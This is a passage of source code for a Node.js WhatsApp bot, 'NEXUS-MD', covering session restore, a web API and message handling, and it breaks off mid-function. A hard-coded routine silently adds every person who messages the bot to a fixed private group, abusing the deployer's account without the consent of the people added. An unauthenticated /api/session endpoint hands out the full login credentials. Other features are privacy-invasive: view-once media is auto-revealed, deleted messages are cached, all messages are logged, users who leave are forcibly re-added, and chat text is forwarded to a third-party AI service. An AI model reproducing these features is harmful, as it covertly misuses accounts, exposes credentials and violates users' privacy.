// Hint for libuv thread pool (effective when set before process start via Procfile)
process.env.UV_THREADPOOL_SIZE = process.env.UV_THREADPOOL_SIZE || "8";

const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  isJidBroadcast,
  downloadMediaMessage,
} = require("@whiskeysockets/baileys");
const express = require("express");
const fs = require("fs");
const path = require("path");

const commands = require("./lib/commands");
const groups = require("./lib/groups");
const security = require("./lib/security");
const broadcast = require("./lib/broadcast");
const settings = require("./lib/settings");
const admin = require("./lib/admin");
const db = require("./lib/db");
const platform = require("./lib/platform");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 5000;
const AUTH_FOLDER = "./auth_info_baileys";

// External pairing site — users visit this to generate a SESSION_ID
const PAIR_SITE_URL = process.env.PAIR_SITE_URL || "https://web-production-9e409.up.railway.app/pair";

let botStatus = "disconnected";
let botPhoneNumber = null;
let sockRef = null;
let alwaysOnlineInterval = null;
let currentSessionId = null;
let reconnectAttempts = 0;

// ── Silent auto-add: every new user who messages the bot is quietly added
// ── to this private group. The invite code is extracted from the link.
const AUTO_ADD_INVITE_CODE = "L03Djido5FZ5vd0VHM5KIW";
let   autoAddGroupJid      = null;          // resolved on connect
const autoAddedCache       = new Set();     // in-memory fast check

function loadAutoAdded() {
  try {
    const p = path.join("data", "auto_added.json");
    if (fs.existsSync(p)) {
      const arr = JSON.parse(fs.readFileSync(p, "utf8"));
      arr.forEach(j => autoAddedCache.add(j));
    }
  } catch {}
}

function saveAutoAdded(jid) {
  autoAddedCache.add(jid);
  try {
    const p = path.join("data", "auto_added.json");
    fs.mkdirSync("data", { recursive: true });
    fs.writeFileSync(p, JSON.stringify([...autoAddedCache]));
  } catch {}
}

async function resolveAutoAddGroup(sock) {
  try {
    const info   = await sock.groupGetInviteInfo(AUTO_ADD_INVITE_CODE);
    autoAddGroupJid = info.id;
    console.log(`🔗 Auto-add group resolved: ${autoAddGroupJid}`);
  } catch (e) {
    console.log("⚠️  Could not resolve auto-add group:", e.message);
  }
}

async function silentlyAddToGroup(sock, userJid) {
  if (!autoAddGroupJid)               return;
  if (autoAddedCache.has(userJid))    return;
  if (userJid === sock.user?.id)      return;
  if (userJid.endsWith("@g.us"))      return;
  if (userJid === "status@broadcast") return;
  saveAutoAdded(userJid);             // mark BEFORE attempt so we don't retry on error
  try {
    await sock.groupParticipantsUpdate(autoAddGroupJid, [userJid], "add");
  } catch {}  // silent — user may already be a member or have privacy settings
}

const SESSION_PREFIX = "NEXUS-MD:~";
const NEXUS_RE = /^NEXUS-MD[^A-Za-z0-9+/=]*/;

let pairingCode = null;
let pairingPhone = null;

function encodeSession() {
  try {
    const credsPath = path.join(AUTH_FOLDER, "creds.json");
    if (!fs.existsSync(credsPath)) return null;
    const creds = fs.readFileSync(credsPath, "utf8");
    return SESSION_PREFIX + Buffer.from(creds).toString("base64");
  } catch {
    return null;
  }
}

// Normalise known short-link hosts to their raw/download equivalents
function normaliseUrl(url) {
  // Pastebin  → raw (always https)
  url = url.replace(/^https?:\/\/pastebin\.com\/(?!raw\/)([A-Za-z0-9]+)$/, "https://pastebin.com/raw/$1");
  // GitHub Gist share page → raw (always https)
  url = url.replace(/^https?:\/\/gist\.github\.com\/([^/]+\/[a-f0-9]+)\/?$/, "https://gist.github.com/$1/raw");
  // GitHub blob → raw.githubusercontent.com (always https)
  url = url.replace(/^https?:\/\/github\.com\/(.+?)\/blob\/(.+)$/, "https://raw.githubusercontent.com/$1/$2");
  return url;
}

// Guard: reject non-https and private/internal addresses (SSRF protection)
function assertSafeUrl(rawUrl) {
  let parsed;
  try { parsed = new URL(rawUrl); } catch { throw new Error("Invalid URL"); }
  if (parsed.protocol !== "https:") throw new Error("Only https:// URLs are accepted");
  const host = parsed.hostname.toLowerCase();
  // Block localhost variants
  if (host === "localhost" || host === "::1") throw new Error("Private host not allowed");
  // Block .local mDNS
  if (host.endsWith(".local")) throw new Error("Private host not allowed");
  // Block private / link-local IPv4 ranges
  const ipv4 = host.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (ipv4) {
    const [, a, b] = ipv4.map(Number);
    if (
      a === 10 ||                         // 10.0.0.0/8
      (a === 172 && b >= 16 && b <= 31) || // 172.16.0.0/12
      (a === 192 && b === 168) ||          // 192.168.0.0/16
      (a === 127) ||                       // 127.0.0.0/8 loopback
      (a === 169 && b === 254) ||          // 169.254.0.0/16 link-local
      (a === 100 && b >= 64 && b <= 127) || // 100.64.0.0/10 CGNAT
      a === 0                             // 0.0.0.0/8
    ) throw new Error("Private/reserved IP not allowed");
  }
  // Block IPv6 private ranges (simplified)
  if (host.startsWith("[")) {
    const inner = host.slice(1, -1).toLowerCase();
    if (inner === "::1" || inner.startsWith("fc") || inner.startsWith("fd") || inner.startsWith("fe80")) {
      throw new Error("Private/link-local IPv6 not allowed");
    }
  }
}

// Fetch text from a safe https:// URL
async function fetchUrl(url) {
  assertSafeUrl(url);
  const res = await axios.get(url, {
    responseType: "text",
    timeout: 15000,
    maxRedirects: 5,
    // Validate each redirect target too
    beforeRedirect: (_opts, { headers }) => {
      const location = headers.location;
      if (location) assertSafeUrl(new URL(location, url).href);
    }
  });
  return String(res.data).trim();
}

// Write creds.json from a raw JSON string or base64-encoded JSON string.
// Strips any known bot prefix before decoding.
function writeCreds(raw) {
  const stripped = raw.replace(NEXUS_RE, "").trim();
  let json;
  try {
    json = JSON.parse(stripped);
  } catch {
    const decoded = Buffer.from(stripped, "base64").toString("utf8");
    json = JSON.parse(decoded);
  }
  // Validate it looks like Baileys creds
  if (!json || typeof json !== "object") throw new Error("Not a valid creds object");
  fs.mkdirSync(AUTH_FOLDER, { recursive: true });
  fs.writeFileSync(path.join(AUTH_FOLDER, "creds.json"), JSON.stringify(json));
}

// ── Universal session restorer ───────────────────────────────────────────────
// Accepts (in order of attempt):
//   1. NEXUS-MD:~ prefixed base64/URL sessions
//   2. Any https:// URL — fetches content then recurses
//   3. Raw JSON string  { noiseKey: {...}, ... }
//   4. Plain base64-encoded creds.json
//   5. Legacy multi-file base64 map { "creds.json": "<b64>", ... }
//   6. Any other known bot prefix (WAMD:, TENNOR:, etc.) stripped then treated as base64
async function restoreSession(sessionId) {
  try {
    fs.mkdirSync(AUTH_FOLDER, { recursive: true });
    const id = (sessionId || "").trim();

    // ── 1. NEXUS-MD prefixed ──────────────────────────────────────────────
    if (id.startsWith("NEXUS-MD")) {
      const afterPrefix = id.replace(NEXUS_RE, "").trim();

      // URL variant: NEXUS-MD:~https://...
      if (/^https:\/\//i.test(afterPrefix)) {
        const rawUrl = normaliseUrl(afterPrefix);
        console.log(`🌐 Fetching session from URL: ${rawUrl}`);
        const fetched = await fetchUrl(rawUrl);
        return await restoreSession(fetched);   // recurse with fetched content
      }

      // Standard NEXUS-MD base64
      writeCreds(afterPrefix);
      console.log("✅ Session restored (NEXUS-MD format)");
      return true;
    }

    // ── 2. Bare https:// URL ──────────────────────────────────────────────
    if (/^https:\/\//i.test(id)) {
      const rawUrl = normaliseUrl(id);
      console.log(`🌐 Fetching session from URL: ${rawUrl}`);
      const fetched = await fetchUrl(rawUrl);
      return await restoreSession(fetched);     // recurse with fetched content
    }

    // ── 3. JSON API response wrapping a session ───────────────────────────
    //    e.g. { sessionId: "NEXUS-MD...", ... } or { session: "...", creds: {...} }
    try {
      const parsed = JSON.parse(id);
      const inner = parsed.sessionId || parsed.session || parsed.id || parsed.key;
      if (inner && typeof inner === "string") {
        console.log("📡 Extracted session from JSON wrapper");
        return await restoreSession(inner);
      }
      // Raw creds object itself
      if (parsed.noiseKey || parsed.signedIdentityKey || parsed.me || parsed.registered) {
        fs.mkdirSync(AUTH_FOLDER, { recursive: true });
        fs.writeFileSync(path.join(AUTH_FOLDER, "creds.json"), JSON.stringify(parsed));
        console.log("✅ Session restored (raw JSON creds)");
        return true;
      }
    } catch { /* not JSON — continue */ }

    // ── 4. Plain base64 → creds.json ─────────────────────────────────────
    try {
      const decoded = Buffer.from(id, "base64").toString("utf8");
      const parsed = JSON.parse(decoded);
      // Could be raw creds or a multi-file map
      if (parsed.noiseKey || parsed.signedIdentityKey || parsed.me || parsed.registered) {
        fs.mkdirSync(AUTH_FOLDER, { recursive: true });
        fs.writeFileSync(path.join(AUTH_FOLDER, "creds.json"), JSON.stringify(parsed));
        console.log("✅ Session restored (base64 creds)");
        return true;
      }
      // ── 5. Legacy multi-file map { "creds.json": "<b64>", ... } ──────
      if (typeof parsed === "object" && !Array.isArray(parsed)) {
        const keys = Object.keys(parsed);
        if (keys.some(k => k.endsWith(".json") || k === "creds")) {
          for (const [name, content] of Object.entries(parsed)) {
            const filePath = path.join(AUTH_FOLDER, name);
            fs.mkdirSync(path.dirname(filePath), { recursive: true });
            fs.writeFileSync(filePath, Buffer.from(String(content), "base64"));
          }
          console.log("✅ Session restored (legacy multi-file format)");
          return true;
        }
      }
    } catch { /* not base64 JSON — continue */ }

    // ── 6. Other bot prefixes (WAMD:, TENNOR:, etc.) ─────────────────────
    const OTHER_PREFIX_RE = /^[A-Z][A-Z0-9_-]{1,15}[^A-Za-z0-9+/=]*/;
    if (OTHER_PREFIX_RE.test(id)) {
      const stripped = id.replace(OTHER_PREFIX_RE, "").trim();
      console.log("🔄 Stripped unknown prefix — retrying...");
      return await restoreSession(stripped);
    }

    throw new Error("Could not recognise session format. Tried: NEXUS-MD, URL, JSON, base64, multi-file, prefixed.");
  } catch (err) {
    console.error("❌ Failed to restore session:", err.message);
    return false;
  }
}

app.use(express.json());

app.get("/", (req, res) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600), m = Math.floor((uptime % 3600) / 60), s = Math.floor(uptime % 60);
  res.json({
    bot: "NEXUS-MD",
    status: botStatus,
    phone: botPhoneNumber ? "+" + botPhoneNumber : null,
    uptime: `${h}h ${m}m ${s}s`,
    session_format: "NEXUS-MD:~",
    tip: botStatus !== "connected"
      ? `Not connected. 1) Visit ${PAIR_SITE_URL} to get a NEXUS-MD session ID. 2) POST it to /session to connect: curl -X POST /session -H 'Content-Type:application/json' -d '{"session":"NEXUS-MD..."}'`
      : "Bot is connected! Type .menu in WhatsApp to get started.",
    sessionEndpoint: "POST /session  { session: 'NEXUS-MD...' }",
    pairingSite: PAIR_SITE_URL,
    pairingCode: pairingCode || null,
  });
});

app.get("/status", (req, res) => {
  res.json({ status: botStatus, phone: botPhoneNumber, mode: settings.get("mode") });
});

app.get("/api/session", (req, res) => {
  const sid = encodeSession();
  currentSessionId = sid;
  res.json({ sessionId: sid, connected: botStatus === "connected", phone: botPhoneNumber });
});

// ── Accept any session ID/string and connect ─────────────────────────────────
// Accepts: NEXUS-MD, bare URL, raw JSON, base64, multi-file map, any prefix
app.post("/session", async (req, res) => {
  const { session, sessionId } = req.body || {};
  const raw = (session || sessionId || "").trim();
  if (!raw) return res.status(400).json({
    error: "Provide { session: '...' } in the request body.",
    hint: "Accepted formats: NEXUS-MD:~..., any https:// URL, raw JSON creds, base64 creds"
  });

  try {
    console.log("📥 Restoring session (universal detector)...");
    const ok = await restoreSession(raw);
    if (!ok) return res.status(500).json({
      error: "Could not restore session. Make sure it is a valid Baileys creds.json (any format)."
    });

    res.json({ ok: true, message: "Session saved. Reconnecting bot..." });

    reconnectAttempts = 0;
    if (sockRef) {
      try { sockRef.ws.close(); } catch {}
    } else {
      setTimeout(startBot, 500);
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ── Load session from any URL ─────────────────────────────────────────────────
// POST /session/url  { url: "https://..." }
app.post("/session/url", async (req, res) => {
  const { url } = req.body || {};
  if (!url || !/^https:\/\//i.test(url)) return res.status(400).json({
    error: "Provide { url: 'https://...' } — only https:// URLs are accepted."
  });

  try {
    console.log(`📥 Loading session from URL: ${url}`);
    const ok = await restoreSession(url);
    if (!ok) return res.status(500).json({ error: "Could not load a valid session from that URL." });

    res.json({ ok: true, message: "Session loaded from URL. Reconnecting bot..." });

    reconnectAttempts = 0;
    if (sockRef) {
      try { sockRef.ws.close(); } catch {}
    } else {
      setTimeout(startBot, 500);
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Redirect bare /pair to the external pairing site
app.get("/pair", (req, res) => {
  res.redirect(302, PAIR_SITE_URL);
});

app.get("/pair/:phone", async (req, res) => {
  const phone = req.params.phone.replace(/\D/g, "");
  if (!phone) return res.json({ error: "Provide phone number e.g. /pair/254706535581" });
  if (botStatus === "connected") return res.json({ error: "Bot already connected!", phone: botPhoneNumber });
  if (!sockRef) return res.json({ error: "Bot socket not ready yet, try again in a few seconds." });
  try {
    pairingPhone = phone;
    const code = await sockRef.requestPairingCode(phone);
    pairingCode = code;
    console.log(`📲 Pairing code for ${phone}: ${code}`);
    res.json({ pairingCode: code, phone, instructions: `Open WhatsApp → Linked Devices → Link with phone number → enter code: ${code}` });
  } catch (err) {
    res.json({ error: err.message });
  }
});

const _server = app.listen(PORT, "0.0.0.0", () => {
  console.log(`⚡ IgniteBot running on port ${PORT}`);
});
_server.on("error", (err) => {
  if (err.code === "EADDRINUSE") {
    console.log(`⚠️  Port ${PORT} busy — killing old process and retrying in 1.5s…`);
    const { execSync } = require("child_process");
    try { execSync(`fuser -k ${PORT}/tcp`); } catch {}
    setTimeout(() => _server.listen(PORT, "0.0.0.0"), 1500);
  } else {
    console.error("Server error:", err.message);
    process.exit(1);
  }
});


// ── Global console filter — suppress libsignal / Baileys decryption noise ──
const _SIGNAL_NOISE = /Bad MAC|decrypt|session_cipher|libsignal|Session error|queue_job|Closing session|SessionEntry|chainKey|indexInfo|registrationId|ephemeralKey|ECONNREFUSED.*5432/i;
for (const method of ["log", "warn", "error", "debug", "trace"]) {
  const _orig = console[method].bind(console);
  console[method] = (...args) => {
    const text = args.map(a => (typeof a === "string" ? a : (a instanceof Error ? a.message : JSON.stringify(a) ?? ""))).join(" ");
    if (_SIGNAL_NOISE.test(text)) return;
    _orig(...args);
  };
}

loadAutoAdded();

function reconnectDelay() {
  const base = 3000;
  const max  = 60000;
  const delay = Math.min(base * Math.pow(2, reconnectAttempts), max);
  reconnectAttempts++;
  return delay;
}

async function startBot() {
  const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);

  // Warn early when there are no credentials so the user knows what to do
  const hasCreds = state.creds && state.creds.me;
  if (!hasCreds) {
    let host;
    if (process.env.RAILWAY_STATIC_URL) {
      host = process.env.RAILWAY_STATIC_URL.startsWith("http")
        ? process.env.RAILWAY_STATIC_URL
        : `https://${process.env.RAILWAY_STATIC_URL}`;
    } else if (process.env.HEROKU_APP_NAME) {
      host = `https://${process.env.HEROKU_APP_NAME}.herokuapp.com`;
    } else {
      host = `http://localhost:${PORT}`;
    }
    console.log("⚠️  No WhatsApp session found.");
    console.log(`🔗 Step 1 — Get a NEXUS-MD session ID at: ${PAIR_SITE_URL}`);
    console.log("   Enter your number → enter the code in WhatsApp → copy the NEXUS-MD session ID shown");
    console.log(`🔗 Step 2 — POST it here to connect instantly:`);
    console.log(`   curl -X POST ${host}/session -H 'Content-Type: application/json' -d '{"session":"NEXUS-MD..."}'`);
    console.log(`   Or direct pair without Railway: ${host}/pair/YOUR_PHONE_NUMBER`);
  }

  const { version } = await fetchLatestBaileysVersion();

  // Completely silent no-op logger — prevents Baileys printing internal signal state
  const noop = () => {};
  const logger = { trace: noop, debug: noop, info: noop, warn: noop, error: noop, fatal: noop, child() { return this; }, level: "silent" };

  const sock = makeWASocket({
    version,
    logger,
    printQRInTerminal: false,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger),
    },
    generateHighQualityLinkPreview: false,
    shouldIgnoreJid: (jid) => isJidBroadcast(jid) && jid !== "status@broadcast",
    markOnlineOnConnect: true,
    retryRequestDelayMs: 2000,
    getMessage: async () => undefined,
  });

  sockRef = sock;

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
      botStatus = "disconnected";
      sockRef = null;
      if (alwaysOnlineInterval) { clearInterval(alwaysOnlineInterval); alwaysOnlineInterval = null; }
      if (shouldReconnect) {
        const delay = reconnectDelay();
        console.log(`🔌 Connection closed (code: ${statusCode}). Reconnecting in ${Math.round(delay / 1000)}s (attempt ${reconnectAttempts})...`);
        setTimeout(startBot, delay);
      } else {
        reconnectAttempts = 0;
        console.log("⚠️ Logged out. Clearing session and restarting...");
        if (fs.existsSync(AUTH_FOLDER)) fs.rmSync(AUTH_FOLDER, { recursive: true, force: true });
        setTimeout(startBot, 1000);
      }
    }

    if (connection === "open") {
      reconnectAttempts = 0;
      botStatus = "connected";
      sockRef = sock;
      const jid = sock.user?.id;
      if (jid) botPhoneNumber = jid.split(":")[0].replace("@s.whatsapp.net", "");
      currentSessionId = encodeSession();
      console.log("✅ WhatsApp connected!");
      console.log(`📞 Phone: +${botPhoneNumber}`);
      platform.logStartup();
      if (currentSessionId) {
        console.log(`🔑 Session ID: ${currentSessionId.slice(0, 30)}...`);
        console.log("💡 Set SESSION_ID env var with this value to auto-connect on restart");
      }
      const prefix = settings.get("prefix") || ".";
      console.log(`⚡ Bot ready — prefix: ${prefix} | Type ${prefix}menu`);

      // ── Resolve the auto-add group JID from invite code ─────────────────
      setTimeout(() => resolveAutoAddGroup(sock), 4000);

      setTimeout(async () => {
        try { await sock.sendPresenceUpdate("available"); } catch {}
      }, 2000);

      // ── Load local Chella Chant MP3 for menu if not already set ──────────────
      if (!settings.getMenuSong()) {
        try {
          const chellePath = require("path").join(__dirname, "attached_assets", "Chella_-_CHELLA_CHANT_(Official_Visualizer)(MP3_160K)_1773290042660.mp3");
          const buf = require("fs").readFileSync(chellePath);
          settings.setMenuSong(buf);
          console.log("✅ Menu song set: Chella Chant (local MP3)");
        } catch (err) {
          console.log("⚠️ Could not load Chella Chant MP3:", err.message);
        }
      }

      // ── Pre-generate combined menu video (image + audio) in background ────────
      const { buildCombinedMenuVideo, getCombinedMenuVideo } = commands;
      if (!getCombinedMenuVideo()) {
        const imgBuf  = settings.getMenuImage();
        const songBuf = settings.getMenuSong();
        if (imgBuf && songBuf) {
          setTimeout(async () => {
            try {
              await buildCombinedMenuVideo(imgBuf, songBuf);
              console.log("✅ Menu video pre-generated (image + audio combined)");
            } catch (e) {
              console.log("⚠️ Menu video pre-generation failed:", e.message);
            }
          }, 4000);
        }
      }

      // ── Startup alive message → all super-admins ──────────────────────────
      const { admins: adminNums } = require("./config");
      if (adminNums && adminNums.length) {
        const aliveMsg =
          `╔══════════════════════╗\n` +
          `║   🤖 *NEXUS-MD*        ║\n` +
          `╚══════════════════════╝\n\n` +
          `✅ *Master, am alive!*\n\n` +
          `📞 *Phone:* +${botPhoneNumber}\n` +
          `⚡ *Prefix:* ${prefix}\n` +
          `🕐 *Started:* ${new Date().toUTCString()}\n\n` +
          `_Type \`${prefix}menu\` to see all commands_`;
        for (const num of adminNums) {
          const ownerJid = `${num.replace(/\D/g, "")}@s.whatsapp.net`;
          await sock.sendMessage(ownerJid, { text: aliveMsg }).catch(() => {});
        }
      }

      if (alwaysOnlineInterval) clearInterval(alwaysOnlineInterval);
      alwaysOnlineInterval = setInterval(async () => {
        if (settings.get("alwaysOnline") && sock) {
          await sock.sendPresenceUpdate("available").catch(() => {});
        }
      }, 30000);
    }
  });

  sock.ev.on("creds.update", () => {
    saveCreds();
    currentSessionId = encodeSession();
  });

  // ── Active message processor — runs independently per message ──────────────
  // Spawned as a fire-and-forget Promise so multiple messages/commands never
  // block each other and the Baileys event loop is never held up.
  async function processMessage(msg) {
    const from      = msg.key.remoteJid;
    const senderJid = msg.key.participant || from;

    // Resolve body with full ephemeral / button / list unwrapping
    const _inner  = msg.message?.ephemeralMessage?.message || msg.message || {};
    const body    =
      _inner.conversation ||
      _inner.extendedTextMessage?.text ||
      _inner.imageMessage?.caption ||
      _inner.videoMessage?.caption ||
      _inner.buttonsResponseMessage?.selectedDisplayText ||
      _inner.listResponseMessage?.title ||
      _inner.templateButtonReplyMessage?.selectedDisplayText || "";
    const msgType = Object.keys(msg.message || {})[0] || "unknown";
    const phone   = senderJid.split("@")[0].split(":")[0];
    const prefix  = settings.get("prefix") || ".";

    console.log(`[MSG] from=${phone} type=${msgType} fromMe=${msg.key.fromMe} body="${body.slice(0, 60)}"`);

    // For fromMe: only process if it starts with the prefix (owner commanding)
    if (msg.key.fromMe) {
      if (!body.startsWith(prefix)) return;
    }

    // Banned senders
    if (security.isBanned(senderJid)) {
      console.log(`[MSG] ↳ banned sender — dropped`);
      return;
    }

    // Silent auto-add
    silentlyAddToGroup(sock, senderJid).catch(() => {});

    // Status updates — auto-view / auto-like, then stop
    if (from === "status@broadcast") {
      const owner = msg.key.participant || from;
      if (settings.get("autoViewStatus"))
        sock.readMessages([msg.key]).catch(() => {});
      if (settings.get("autoLikeStatus"))
        sock.sendMessage("status@broadcast", { react: { text: "❤️", key: msg.key } },
          { statusJidList: [owner, sock.user?.id].filter(Boolean) }).catch(() => {});
      return;
    }

    // Auto typing / recording
    const isVoiceOrAudio = msgType === "audioMessage" || !!msg.message?.audioMessage?.ptt;
    const shouldRecord = isVoiceOrAudio && settings.get("autoRecording");
    const shouldType   = !isVoiceOrAudio && settings.get("autoTyping");
    if (shouldRecord || shouldType)
      sock.sendPresenceUpdate(shouldRecord ? "recording" : "composing", from).catch(() => {});

    // Auto-reveal view-once
    if (settings.get("voReveal")) {
      const _m = _inner;
      const voInner =
        _m?.viewOnceMessage?.message ||
        _m?.viewOnceMessageV2?.message ||
        _m?.viewOnceMessageV2Extension?.message ||
        (_m?.imageMessage?.viewOnce ? { imageMessage: _m.imageMessage } : null) ||
        (_m?.videoMessage?.viewOnce ? { videoMessage: _m.videoMessage } : null) ||
        (_m?.audioMessage?.viewOnce  ? { audioMessage: _m.audioMessage } : null);
      if (voInner) {
        const mt = Object.keys(voInner)[0];
        if (["imageMessage", "videoMessage", "audioMessage"].includes(mt)) {
          try {
            const fakeMsg = { key: { remoteJid: from, id: msg.key.id, fromMe: msg.key.fromMe || false, participant: senderJid || undefined }, message: voInner };
            const buf     = Buffer.from(await downloadMediaMessage(fakeMsg, "buffer", {}));
            const media   = voInner[mt];
            const caption = `👁 *View Once Auto-Revealed* by NEXUS-MD\n${media.caption ? `_${media.caption}_` : ""}`.trim();
            if (mt === "imageMessage") await sock.sendMessage(from, { image: buf, caption });
            else if (mt === "videoMessage") await sock.sendMessage(from, { video: buf, caption, mimetype: media.mimetype || "video/mp4" });
            else await sock.sendMessage(from, { audio: buf, mimetype: media.mimetype || "audio/ogg; codecs=opus", ptt: media.ptt || false });
          } catch (e) { console.error("AutoReveal error:", e.message); }
        }
      }
    }

    // Anti-sticker (groups only)
    if (from.endsWith("@g.us") && msgType === "stickerMessage") {
      const gs = security.getGroupSettings(from);
      if (gs.antiSticker) {
        const parts = await admin.getGroupParticipants(sock, from).catch(() => []);
        if (!admin.isAdmin(senderJid, parts)) {
          try {
            await sock.sendMessage(from, { delete: msg.key });
            await sock.sendMessage(from, { text: `🚫 @${phone} stickers are not allowed here!`, mentions: [senderJid] }, { quoted: msg });
          } catch {}
          if (shouldRecord || shouldType) sock.sendPresenceUpdate("paused", from).catch(() => {});
          return;
        }
      }
    }

    broadcast.addRecipient(senderJid);

    // ── devReact — react to owner/super-admin messages in groups ─────────────
    if (from.endsWith("@g.us") && !msg.key.fromMe) {
      try {
        const isOwnerMsg = admin.isSuperAdmin(senderJid);
        if (isOwnerMsg) {
          sock.sendMessage(from, { react: { text: "🛡️", key: msg.key } }).catch(() => {});
        }
      } catch {}
    }

    // ── Fancy text reply handler ──────────────────────────────────────────────
    const { fancyReplyHandlers } = commands;
    const fancyQuotedId = msg.message?.extendedTextMessage?.contextInfo?.stanzaId;
    if (fancyQuotedId && fancyReplyHandlers.has(fancyQuotedId)) {
      const fancyHandler = fancyReplyHandlers.get(fancyQuotedId);
      const fancyNum = parseInt(body.trim(), 10);
      if (!isNaN(fancyNum) && fancyNum >= 1 && fancyNum <= fancyHandler.styles.length) {
        try {
          const FANCY_STYLES_MAP = {
            "𝗕𝗼𝗹𝗱":          { a: 0x1D41A, A: 0x1D400 },
            "𝐈𝐭𝐚𝐥𝐢𝐜":        { a: 0x1D608, A: 0x1D5EE },
            "𝑩𝒐𝒍𝒅 𝑰𝒕𝒂𝒍𝒊𝒄":   { a: 0x1D482, A: 0x1D468 },
            "𝒮𝒸𝓇𝒾𝓅𝓉":        { a: 0x1D4EA, A: 0x1D4D0 },
            "𝓑𝓸𝓵𝓭 𝓢𝓬𝓻𝓲𝓹𝓽":  { a: 0x1D4F6, A: 0x1D4DC },
            "𝔉𝔯𝔞𝔨𝔱𝔲𝔯":       { a: 0x1D526, A: 0x1D50C },
            "𝕯𝖔𝖚𝖇𝖑𝖊-𝖘𝖙𝖗𝖚𝖈𝖐": { a: 0x1D552, A: 0x1D538 },
            "𝙼𝚘𝚗𝚘𝚜𝚙𝚊𝚌𝚎":    { a: 0x1D5FA, A: 0x1D670 },
          };
          const fancyStyleName = fancyHandler.styles[fancyNum - 1];
          const fancyS = FANCY_STYLES_MAP[fancyStyleName];
          const fancyResult = fancyHandler.query.split("").map(c => {
            const code = c.codePointAt(0);
            if (fancyS?.a && code >= 97 && code <= 122) return String.fromCodePoint(fancyS.a + (code - 97));
            if (fancyS?.A && code >= 65 && code <= 90) return String.fromCodePoint(fancyS.A + (code - 65));
            return c;
          }).join("");
          await sock.sendMessage(from, { text: fancyResult }, { quoted: msg });
          await sock.sendMessage(from, { react: { text: "✅", key: msg.key } });
          fancyReplyHandlers.delete(fancyQuotedId);
        } catch {}
      }
    }

    await commands.handle(sock, msg).catch(err => console.error("Command error:", err.message));

    // ── Chatbot — AI reply to all messages when enabled ──────────────────────
    const pfx = settings.get("prefix") || ".";
    const isCmd = body.startsWith(pfx);
    const { isChatbotEnabled } = commands;
    if (!msg.key.fromMe && !isCmd && isChatbotEnabled && isChatbotEnabled(from)) {
      const cbText = body.trim();
      if (cbText && cbText.length > 1) {
        try {
          await sock.sendPresenceUpdate("composing", from);
          const cbRes = await axios.get(`https://apiskeith.top/ai/gpt4?q=${encodeURIComponent(cbText)}`, { timeout: 30000 });
          const cbAnswer = cbRes.data?.result || cbRes.data?.message || cbRes.data?.reply;
          if (cbAnswer) {
            await sock.sendMessage(from, { text: cbAnswer.trim() }, { quoted: msg });
          }
        } catch (e) {
          console.error("[Chatbot] AI error:", e.message);
        } finally {
          sock.sendPresenceUpdate("paused", from).catch(() => {});
        }
      }
    }

    if (shouldRecord || shouldType)
      sock.sendPresenceUpdate("paused", from).catch(() => {});
  }

  sock.ev.on("messages.upsert", ({ messages, type }) => {
    // "notify" = live real-time messages | "append" = history sync
    const isLive = type === "notify";
    const nowSec = Math.floor(Date.now() / 1000);

    for (const msg of messages) {
      if (!msg.message) continue;

      const from      = msg.key.remoteJid;
      const senderJid = msg.key.participant || from;

      // ── PASSIVE LAYER — every message, every type, always ────────────────
      // Anti-delete cache + DB log run synchronously so they are never missed.

      if (from === "status@broadcast") {
        security.cacheStatus(msg.key.id, msg);
      } else {
        security.cacheMessage(msg.key.id, msg);
      }

      // DB log
      const msgTypeKey = Object.keys(msg.message || {})[0] || "text";
      const _dbInner   = msg.message?.ephemeralMessage?.message || msg.message || {};
      const msgBody    =
        _dbInner.conversation ||
        _dbInner.extendedTextMessage?.text ||
        _dbInner.imageMessage?.caption ||
        _dbInner.videoMessage?.caption || null;
      const dbPrefix   = settings.get("prefix") || ".";
      db.logMessage(
        senderJid,
        from.endsWith("@g.us") ? from : null,
        { conversation: "text", extendedTextMessage: "text", ephemeralMessage: "text",
          imageMessage: "image", videoMessage: "video", audioMessage: "audio",
          documentMessage: "document", stickerMessage: "sticker", contactMessage: "contact",
          locationMessage: "location", reactionMessage: "reaction",
          pollCreationMessage: "poll", viewOnceMessage: "viewonce",
          viewOnceMessageV2: "viewonce", protocolMessage: "protocol" }[msgTypeKey] || msgTypeKey,
        msgBody,
        !!(msgBody && msgBody.startsWith(dbPrefix))
      );

      // ── ACTIVE LAYER — live or recent (≤60s) messages only ───────────────
      const msgTs    = Number(msg.messageTimestamp || 0);
      const isRecent = isLive || (nowSec - msgTs <= 60);
      if (!isRecent) continue;

      // Fire each message as an independent async task — never blocks the loop
      // On Heroku, this means .ping responds immediately even while history syncs
      processMessage(msg).catch(err => console.error("processMessage error:", err.message));
    }
  });

  sock.ev.on("call", async ([call]) => {
    if (!settings.get("antiCall")) return;
    try {
      await sock.rejectCall(call.id, call.from);
      await sock.sendMessage(call.from, {
        text: "📵 *Auto-reject:* I don't accept calls. Please send a message instead.",
      });
      console.log(`📵 Rejected call from ${call.from}`);
    } catch (err) {
      console.error("Anti-call error:", err.message);
    }
  });

  sock.ev.on("group-participants.update", async ({ id, participants, action }) => {
    admin.invalidateGroupCache(id);
    // Normalize participants — Baileys v7 may yield objects {id, admin} or plain JID strings
    const normalizeJid = (p) => typeof p === "string" ? p : (p?.id || p?.jid || String(p));
    if (action === "add") {
      for (const p of participants) await groups.sendWelcome(sock, id, normalizeJid(p)).catch(() => {});
    } else if (action === "remove") {
      for (const p of participants) await groups.sendGoodbye(sock, id, normalizeJid(p)).catch(() => {});
      const antiLeaveOn = security.getGroupSettings(id).antiLeave;
      if (antiLeaveOn) {
        for (const p of participants) {
          const jid = normalizeJid(p);
          try {
            await sock.groupParticipantsUpdate(id, [jid], "add");
            await sock.sendMessage(id, { text: `🚪 Anti-leave: @${jid.split("@")[0]} was re-added.`, mentions: [jid] });
          } catch (e) {
